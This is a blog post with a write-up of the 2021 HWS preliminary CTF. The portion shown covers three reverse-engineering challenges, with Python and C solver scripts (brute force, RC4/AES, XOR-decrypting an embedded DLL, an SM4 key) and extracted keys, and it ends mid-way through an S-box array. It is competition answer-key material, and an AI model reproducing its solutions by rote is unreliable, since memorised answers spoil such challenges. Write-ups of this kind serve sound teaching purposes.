<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>2021HWS初赛writeup | velta&#39;s blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="CTF">
    <meta name="description" content="年初打的一场比赛，拿了第8名，把当时写的wp放到博客上来。 reverse1.decrypt主要逻辑就是一个加密，看起来没法逆，但因为加密逻辑简单所以可以自己写一个加密程序逐字节爆破出flag。 1234567891011121314151617181920212223242526result&#x3D;b&quot;\x12\x45\x10\x47\x19\x49\x49\x49\x1A\x4F\x1C\x1E\x">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="2021HWS初赛writeup">
<meta property="og:url" content="https://veltavid.github.io/2021/0811c4c4be.html">
<meta property="og:site_name" content="velta&#39;s blog">
<meta property="og:description" content="年初打的一场比赛，拿了第8名，把当时写的wp放到博客上来。 reverse1.decrypt主要逻辑就是一个加密，看起来没法逆，但因为加密逻辑简单所以可以自己写一个加密程序逐字节爆破出flag。 1234567891011121314151617181920212223242526result&#x3D;b&quot;\x12\x45\x10\x47\x19\x49\x49\x49\x1A\x4F\x1C\x1E\x">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://i.loli.net/2021/08/16/r37cq8ID6UwLpfy.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/gdsUxSiFDzkBMoh.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/idJaNWBhKLfo3sT.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/ePpMYFf18KRrHCc.png">
<meta property="og:image" content="https://i.loli.net/2021/08/16/j6mHsrz8wtnJYx7.png">
<meta property="og:updated_time" content="2021-08-17T01:29:17.253Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/08/16/r37cq8ID6UwLpfy.png">
    
        <link rel="alternate" type="application/atom+xml" title="velta&#39;s blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

</head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">velta</h5>
          <a href="mailto:1020217451@qq.com" target="_blank" rel="noopener" title="1020217451@qq.com" class="mail">1020217451@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/veltavid" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">2021HWS初赛writeup</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">2021HWS初赛writeup</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-08-16T01:21:52.000Z" itemprop="datePublished" class="page-time">
  2021-08-16
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#reverse"><span class="post-toc-number">1.</span> <span class="post-toc-text">reverse</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-decrypt"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">1.decrypt</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-obfu"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">2.obfu</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-babyre"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">3.babyre</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Pwn"><span class="post-toc-number">2.</span> <span class="post-toc-text">Pwn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-emarm"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">1.emarm</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-ememarm"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">2.ememarm</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-justcode"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">3.justcode</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#4-undlcv"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">4.undlcv</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#内核安全"><span class="post-toc-number">3.</span> <span class="post-toc-text">内核安全</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-ddkernel"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">1.ddkernel</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-babycall"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">2.babycall</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#固件安全"><span class="post-toc-number">4.</span> <span class="post-toc-text">固件安全</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-nodemcu"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">1.nodemcu</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-stm"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">2.stm</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-easybios"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">3.easybios</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-2021HWS初赛writeup"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">2021HWS初赛writeup</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-08-16 09:21:52" datetime="2021-08-16T01:21:52.000Z"  itemprop="datePublished">2021-08-16</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <p>年初打的一场比赛，拿了第8名，把当时写的wp放到博客上来。</p>
<h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><h4 id="1-decrypt"><a href="#1-decrypt" class="headerlink" title="1.decrypt"></a>1.decrypt</h4><p>主要逻辑就是一个加密，看起来没法逆，但因为加密逻辑简单所以可以自己写一个加密程序逐字节爆破出flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">result=<span class="string">b"\x12\x45\x10\x47\x19\x49\x49\x49\x1A\x4F\x1C\x1E\x52\x66\x1D\x52\x66\x67\x68\x67\x65\x6F\x5F\x59\x58\x5E\x6D\x70\xA1\x6E\x70\xA3"</span></span><br><span class="line">map=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">	map.append(i)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">	sign=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> v5 <span class="keyword">in</span> map:</span><br><span class="line">		v4=i</span><br><span class="line">		origin=v5</span><br><span class="line">		v3 = <span class="number">2</span> * (v4 &amp; v5)</span><br><span class="line">		v5 ^= v4</span><br><span class="line">		v4 = v3</span><br><span class="line">		<span class="keyword">while</span>(v3):</span><br><span class="line">			v3 = <span class="number">2</span> * (v4 &amp; v5)</span><br><span class="line">			v5 ^= v4</span><br><span class="line">			v4 = v3</span><br><span class="line">		r=v5^<span class="number">0x23</span></span><br><span class="line">		<span class="keyword">if</span>(r==result[i]):</span><br><span class="line">			flag=flag+chr(origin)</span><br><span class="line">			print(chr(origin),end=<span class="string">""</span>)</span><br><span class="line">			sign=<span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">print(<span class="string">""</span>)</span><br><span class="line">print(len(flag))</span><br></pre></td></tr></table></figure>

<h4 id="2-obfu"><a href="#2-obfu" class="headerlink" title="2.obfu"></a>2.obfu</h4><p>是一个混淆了的加密程序，先将输入的字符串转换成对应的字节，然后将前一字节的低3比特与本字节的高5比特组合成新的字节存入新的数组v12中。接下来会通过一些步骤生成之后加密所需的参数，由于与输入无关所以可以直接动调得到。生成参数的前16字节作为rc4的密钥对v12加密，然后是一个AES解密，密钥与rc4的相同，最后与参数的后16字节异或得到最终结果，将这个结果与密文比较，这个密文也可以通过动调得到。最后把结果输入程序即会生成一个flag.txt文件。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">true_result=<span class="string">"\x21\x23\x2F\x29\x7A\x57\xA5\xA7\x43\x89\x4A\x0E\x4A\x80\x1F\xC3"</span></span><br><span class="line">v7=<span class="string">"\x6E\xD6\xCE\x61\xBB\x8F\xB7\xF3\x10\xB7\x70\x45\x9E\xFC\xE1\xB1"</span></span><br><span class="line">plain_text=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">	plain_text[i]=ord(true_result[i])^ord(v7[i])</span><br><span class="line">shared_key=<span class="string">b"\x8C\xE5\x1F\x93\x50\xF4\x45\x11\xA8\x54\xE1\xB5\xF0\xA3\xFB\xCA"</span></span><br><span class="line"></span><br><span class="line">plain_text=bytes(plain_text)</span><br><span class="line">cipher=AES.new(shared_key,AES.MODE_ECB)</span><br><span class="line">cipher_text=cipher.encrypt(plain_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rc4_decrypted=<span class="string">b"\x2c\xa7\x73\x0e\x86\x3c\xb4\x5f\x8f\x87\xae\x91\xf7\x40\x11\x0d"</span><span class="comment">#通过c语言写的rc4解密脚本得到</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">	temp1=(rc4_decrypted[(i+<span class="number">1</span>)%<span class="number">16</span>]&amp;<span class="number">0xe0</span>)&gt;&gt;<span class="number">5</span></span><br><span class="line">	temp2=(rc4_decrypted[i%<span class="number">16</span>]&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">3</span></span><br><span class="line">	y=temp1|temp2</span><br><span class="line">	result=result+str(hex(y))[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">print(result[<span class="number">-2</span>:]+result[:<span class="number">-2</span>])</span><br></pre></td></tr></table></figure>

<p>rc4解密程序:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_KEY 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_STR 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pos_i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> pos_j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sbox[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[MAX_KEY]=&#123;<span class="number">0x8C</span>,<span class="number">0xE5</span>,<span class="number">0x1F</span>,<span class="number">0x93</span>,<span class="number">0x50</span>,<span class="number">0xF4</span>,<span class="number">0x45</span>,<span class="number">0x11</span>,<span class="number">0xA8</span>,<span class="number">0x54</span>,<span class="number">0xE1</span>,<span class="number">0xB5</span>,<span class="number">0xF0</span>,<span class="number">0xA3</span>,<span class="number">0xFB</span>,<span class="number">0xCA</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_sbox</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">generate_key</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encryption</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plaintext,<span class="keyword">unsigned</span> <span class="keyword">char</span> *result)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[MAX_STR]=&#123;<span class="number">0xc0</span>,<span class="number">0x5c</span>,<span class="number">0x32</span>,<span class="number">0x57</span>,<span class="number">0x7f</span>,<span class="number">0xdb</span>,<span class="number">0x3f</span>,<span class="number">0x4d</span>,<span class="number">0x94</span>,<span class="number">0xb8</span>,<span class="number">0xfe</span>,<span class="number">0x13</span>,<span class="number">0x7</span>,<span class="number">0xe3</span>,<span class="number">0x55</span>,<span class="number">0x26</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> result[MAX_STR]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">	len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    encryption((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)str,(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)result);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_sbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> key_len = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)key);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)</span><br><span class="line">        sbox[i]=i;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)&#123;</span><br><span class="line">        j=(j+sbox[i]+key[i%key_len])%<span class="number">256</span>;</span><br><span class="line">        temp = sbox[i];</span><br><span class="line">        sbox[i] = sbox[j];</span><br><span class="line">        sbox[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">generate_key</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line"></span><br><span class="line">    pos_i=(pos_i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">    pos_j = (pos_j+sbox[pos_i])%<span class="number">256</span>;</span><br><span class="line">    temp = sbox[pos_i];</span><br><span class="line">    sbox[pos_i] = sbox[pos_j];</span><br><span class="line">    sbox[pos_j] = temp;</span><br><span class="line">    t = (sbox[pos_i]+sbox[pos_j])%<span class="number">256</span>;</span><br><span class="line">    <span class="keyword">return</span> sbox[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encryption</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plaintext,<span class="keyword">unsigned</span> <span class="keyword">char</span> * result)</span></span>&#123;</span><br><span class="line">    pos_i = <span class="number">0</span>;</span><br><span class="line">    pos_j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)plaintext);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    init_sbox();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line">        result[i]=plaintext[i]^generate_key();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x "</span>,result[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    result[i]=<span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-babyre"><a href="#3-babyre" class="headerlink" title="3.babyre"></a>3.babyre</h4><p>这道题看上去调用了ZwLoadDriver函数，实际上并没有，动调f7步入一直走会来到一个程序内的函数0x412a20，这个函数中可以看到最后有两个调用分别处理了我们输入的前16字节和后16字节。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2021/08/16/r37cq8ID6UwLpfy.png" alt="image-20210201154453065" title="">
                </div>
                <div class="image-caption">image-20210201154453065</div>
            </figure>

<p>为了找到这个加密函数我们分析之前的0x4113ed函数，一直往里走会看到一个关键的标志CIPHER_DLL，使用resource hacker提取出这个加密的dll即可。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2021/08/16/gdsUxSiFDzkBMoh.png" alt="image-20210201154632782" title="">
                </div>
                <div class="image-caption">image-20210201154632782</div>
            </figure>

<p>然后解密这个dll的函数如下，就是用wow!做密钥的异或解密。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2021/08/16/idJaNWBhKLfo3sT.png" alt="image-20210201154806479" title="">
                </div>
                <div class="image-caption">image-20210201154806479</div>
            </figure>

<p>最后在解密出的dll偏移0x4f6de处找到加密逻辑，就是以Ez_5M4_C1pH@r!!!为密钥的sm4加密。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="string">"wow!"</span></span><br><span class="line">resource_f=open(<span class="string">"./cipher_text"</span>,<span class="string">"rb"</span>)</span><br><span class="line">resource=resource_f.read()</span><br><span class="line">resource_f.close()</span><br><span class="line">plain_text=[]</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> resource:</span><br><span class="line">	plain_text.append(x^ord(key[i]))</span><br><span class="line">	i=(i+<span class="number">1</span>)%<span class="number">4</span></span><br><span class="line">plain_text=bytes(plain_text)</span><br><span class="line">plain_f=open(<span class="string">'./plain_text'</span>,<span class="string">"wb"</span>)</span><br><span class="line">plain_f.write(plain_text)</span><br><span class="line">plain_f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SBOX = [<span class="string">'d6'</span>, <span class="string">'90'</span>, <span class="string">'e9'</span>, <span class="string">'fe'</span>, <span class="string">'cc'</span>, <span class="string">'e1'</span>, <span class="string">'3d'</span>, <span class="string">'b7'</span>, <span class="string">'16'</span>, <span class="string">'b6'</span>, <span class="string">'14'</span>, <span class="string">'c2'</span>, <span class="string">'28'</span>, <span class="string">'fb'</span>, <span class="string">'2c'</span>, <span class="string">'05'</span>,</span><br><span class="line">       <span class="string">'2b'</span>, <span class="string">'67'</span>, <span class="string">'9a'</span>, <span class="string">'76'</span>, <span class="string">'2a'</span>, <span class="string">'be'</span>, <span class="string">'04'</span>, <span class="string">'c3'</span>, <span class="string">'aa'</span>, <span class="string">'44'</span>, <span class="string">'13'</span>, <span class="string">'26'</span>, <span class="string">'49'</span>, <span class="string">'86'</span>, <span class="string">'06'</span>, <span class="string">'99'</span>,</span><br><span class="line">       <span class="string">'9c'</span>, <span class="string">'42'</span>, <span class="string">'50'</span>, <span class="string">'f4'</span>, <span class="string">'91'</span>, <span class="string">'ef'</span>, <span class="string">'98'</span>, <span class="string">'7a'</span>, <span class="string">'33'</span>, <span class="string">'54'</span>, <span class="string">'0b'</span>, <span class="string">'43'</span>, <span class="string">'ed'</span>, <span class="string">'cf'</span>, <span class="string">'ac'</span>, <span class="string">'62'</span>,</span><br><span class="line">       <span class="string">'e4'</span>, <span class="string">'b3'</span>, <span class="string">'1c'</span>, <span class="string">'a9'</span>, <span class="string">'c9'</span>, <span class="string">'08'</span>, <span class="string">'e8'</span>, <span class="string">'95'</span>, <span class="string">'80'</span>, <span class="string">'df'</span>, <span class="string">'94'</span>, <span class="string">'fa'</span>, <span class="string">'75'</span>, <span class="string">'8f'</span>, <span class="string">'3f'</span>, <span class="string">'a6'</span>,</span><br><span class="line">       <span class="string">'47'</span>, <span class="string">'07'</span>, <span class="string">'a7'</span>, <span class="string">'fc'</span>, <span class="string">'f3'</span>, <span class="string">'73'</span>, <span class="string">'17'</span>, <span class="string">'ba'</span>, <span class="string">'83'</span>, <span class="string">'59'</span>, <span class="string">'3c'</span>, <span class="string">'19'</span>, <span class="string">'e6'</span>, <span class="string">'85'</span>, <span class="string">'4f'</span>, <span class="string">'a8'</span>,</span><br><span class="line">       <span class="string">'68'</span>, <span class="string">'6b'</span>, <span class="string">'81'</span>, <span class="string">'b2'</span>, <span class="string">'71'</span>, <span class="string">'64'</span>, <span class="string">'da'</span>, <span class="string">'8b'</span>, <span class="string">'f8'</span>, <span 